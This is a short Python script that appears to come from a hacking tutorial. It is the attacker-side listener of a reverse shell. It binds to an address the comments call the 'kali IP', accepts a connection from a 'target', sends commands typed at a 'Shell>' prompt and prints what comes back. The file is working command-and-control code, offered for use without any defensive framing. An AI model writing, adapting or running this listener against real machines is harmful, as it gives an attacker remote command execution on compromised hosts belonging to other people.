# Basic TCP Server 


import socket # For Building TCP Connection



def connect():
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's'
    
    s.bind(("192.168.79.230", 8080)) # 192.168.30.197 define the kali IP and the listening port 192.168.140.130 
    
    s.listen(2) # define the backlog size, since we are expecting a single connection from a single
                                                            # target we will listen to one connection
    
    print( '[+] Listening for incoming TCP connection on port 8080')
    
    conn, addr = s.accept() # accept() function will retuen the connection object ID (conn) and will return the client(target) IP address and source
                                # port in a tuple format (IP,port)
    
    print( '[+] We got a connection from: ', addr)


    while True:
        
        command = input("Shell> ") # Get user input and store it in command variable
        
        if command == 'terminate' : # If we got terminate command, inform the client and close the connect and break the loop
            conn.send(command.encode())
            conn.close()
            break

        else:
            conn.send(command.encode()) # Otherwise we will send the command to the target
            print( conn.recv(3072).decode() )# and print the result that we got back
        
def main ():
    connect()
main()
